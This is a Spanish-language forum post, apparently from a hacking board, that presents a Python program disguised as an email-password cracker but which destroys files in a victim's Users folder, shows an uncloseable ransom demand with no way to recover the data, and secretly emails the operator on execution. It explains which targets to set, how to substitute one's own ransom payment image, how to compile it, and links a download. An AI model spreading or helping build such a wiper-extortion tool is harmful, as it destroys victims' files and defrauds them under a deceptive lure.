# Python_projectV2.23
Buenos días a todos,

No sabia muy bien en que categoría poner este post ya que el programa es funcional pero también se podría hacer muchas mejoras por lo cual estaba a punto de ponerlo en desarrollo pero bueno al final es una primera versión funcional y echo por mi al
 100% por lo cual lo pongo en esta categoría. ( Para Admin : No dude en mover el post si considera que no esta en la buena categoría).


[u][b]pre-Introducción  : [/b][/u]
El programa esta echo en python, me di cuenta al filo de su desarrollo que no era el mejor lenguaje para la interfaz gráfica del programa  pero ya que estaba con ello seguí así.. seguramente me pondré a hacer una versión JAVA que parecerá algo menos "fake".  Y invito a todos a modificar y mejorar esta versión[u] Y COMPARTIR LAS MEJORAS[/u] que puedan hacer . 

[u][b]Que es ? Como funciona ? [/b][/u]
El programa se hará pasar a las victimas por un programa que puede "crackear" las contraseñas de una cuenta mail  solo introduciendo ese mail ( :jaja:  si si .. muchos siguen creyendo que las cosas son asi ... :smile: ) ... 

Lo que realmente haremos es destruir los archivos de la victima y pedir un rescate para que los recupere :rolleyes:  ... Si .. he dicho [b]DESTRUIR[/b] , no es realmente un ransomware ya que [b]no lleva modulo de desencrypcion[/b] por lo cual esperemos que la victima pague pero el pobre no recuperara sus archivos jamas ... 

[b]Asi se presenta la interfaz grafica : [/b]

http://i66.tinypic.com/2nai905.jpg


[b]Cuando pincha en el boton :[/b]

[IMG]http://i63.tinypic.com/2dr5b0x.jpg[/IMG]

[b]Pidiendo el rescate: [/b]
Notar que ha este momento el programa no se puede cerrar con la cruz windows ! Esta echo a posta para que el usuario se fije bien en lo que esta escrito y no cierre en seguida por miedo ect .. ( el programa solo se podra cerrar con "finalizar proceso" en el administrador de tareas. 

[IMG]http://i67.tinypic.com/345zgcy.jpg[/IMG]

[b]Antes: [/b]:

[IMG]http://i67.tinypic.com/ra7siv.jpg[/IMG]

[b]Despues:[/b]

[IMG]http://i63.tinypic.com/e9ympc.jpg[/IMG]

[b]Extensiones afectadas : [/b]

[IMG]http://i65.tinypic.com/2w521jd.jpg[/IMG]

[b][b]BONUS[/b]
El programa informara por correo de ejecución del programa por un usuario y de la finalizacion del proceso[/b]

[IMG]http://i63.tinypic.com/2cnauma.jpg[/IMG]

[b][u]Bueno vale, lo entiendo, pero como lo uso yo ? y que hago con los archivos ? [/u][/b]

Ahora vamos a hablar un poco del código, de lo que deben modificar y como se compila.

Lo primero que debéis saber es que se puede indicar que carpetas, que disco etc se quiere atacar. hay que saber que el proceso en si no es lento pero si lo es cuando hay muchos archivos, yo creo que lo mejor seria usarlo en la carpeta "Users" ya que la mayoría de la gente tiene sus archivos importantes ahí , documentos, fotos, musica etc ... y eso es lo que les molesta perder ... 
También podemos atacar directamente el disco C:/ pero hay una pegita en ello, va a tardar, y puede que el usuario se canse de esperar y cierre el programa por lo cual se encontara con una parte de sus archivos inutilizables pero no vera la petición de rescate que solo aparece una vez finalizado el proceso..   

OBIAMENTE DEBEIS DESCOMPRIMIR LA CARPETA  :smile: ...

Esta es la parte del código donde definimos las carpetas a atacar ( notar que se puede hacer en 2 tiempos ( #text2)) :
Se ve en la captura que la carpeta atacada sera "users" y /* para todas sus subcarpetas.
Los string textexe,fin,all son los mensajes que se recibirá por correo.

[IMG]http://i68.tinypic.com/28jzabl.jpg[/IMG]

Aquí las llamadas : 

[IMG]http://i63.tinypic.com/wloehj.jpg[/IMG]

Los correos : 
Bueno esa parte parece bastante obvia ... donde pone yourmail pones tu email y PASS tu password de la cuenta Gmail ( claro realmente te envías un correo a ti mismo al momento de la ejecución sin que el usuario vea nada.

 [IMG]http://i68.tinypic.com/egtkhu.jpg[/IMG]

Protección de la carpeta del programa :
Esta parte es importante ! Porque ? ya les estaba contando como va eso .. destrucción ! entonces que problema hay ? el usuario se descarga el programa y se lo pone en el escritorio.. lo ejecuta y se empeza a destruir los archivos de las carpetas y subcarpetas de "Users" .. entre las cuales esta el escritorio !!! que crees que pasara cuando el processo llegue a la carpeta del programa ??  :eek:  pues .. BOOUUMM PETA TODO ... hehehe 
Por ello hemos introducido ese codigo que va a omitir la carpeta del programa ( en nuestro ejemplo carpeta que se denomine "v2.23" ( así lo subire pero se puede cambiar y renombrar).

[IMG]http://i67.tinypic.com/2jaeusm.jpg[/IMG]


[b][u]AHORA LO PRINCIPAL ! el programa estará subido con MI imagen de rescate con mis datos de pago ( carpeta bin/) Debeis de hacer la vuestra ya que sino me pagaran a mi !!  :ja:   :ja:  ... [/u][/b]
No me atado mas en esta parte supongo que lo entendéis...

[b][u]PROBLEMAS ENCONTRADOS :[/u][/b]

1/ El programa no es perfecto .. al momento del "loading" el programa suele ponerse en estatuto "No responde" lo que puede hacer creer al usuario que no funciona .. y por ello he puesto el mensaje al usuario en la imagen de loading informando de ello el usuario .. porque el programa sigue funcionando aunque este así y una vez acabado el proceso se pondra corectamente la petición de rescate !!  ( ver foto anterior (No responde)). 

2/ El programa tampoco podrá atacar las carpetas que necesiten acceso real en administrador .. seguramente se pueda modificar eso pero aun no lo he mirado ...


[b][u]Como compilo? que necesito ?[/u][/b]

Necesitas Python ! Y necesitas instalar todas las librerías usadas ! ( pygame etc etc ...)

El archivo de compilación viene con el programa como setup2.py ( notar que viene un icono en los archivos /bin y que ese se puede configurar en el archivo setup2.py

No voy a explicaros como se usa python ni se instala las librerías, bastantes recursos hay en internet sobre eso y la comsola os informa que modulos faltan ...


Aquí viene el programa ( notar que si modificáis nombre de carpetas hay que modificar el programa, que sea para la protección de la carpeta o para indicar donde tiene que buscar las cosas):
https://ufile.io/6gay0
[url]https://ufile.io/6gay0[/url]

Espero que os guste y que algunos propongan algunas mejoras .. yo por mi parte seguiré en ello y puede que suba una versión mejorada en breve .. también pienso pasarlo a JAVA para una mejora (considerable  :mml:   )  de la interfaz gráfica y mas ... 
